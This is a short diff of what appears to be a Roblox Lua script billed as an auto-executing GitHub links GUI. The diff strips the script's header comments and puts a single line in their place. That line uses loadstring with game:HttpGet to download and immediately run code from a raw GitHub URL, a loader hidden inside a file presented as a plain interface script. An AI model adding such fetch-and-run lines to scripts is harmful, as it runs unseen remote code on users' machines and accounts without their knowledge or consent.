@@ -1,5 +1,4 @@
--- Roblox GitHub Links GUI (Auto-Execute Version)
--- Place this script in StarterPlayerScripts (LocalScript)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Working/loadscreen/refs/heads/main/Warning"))()
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
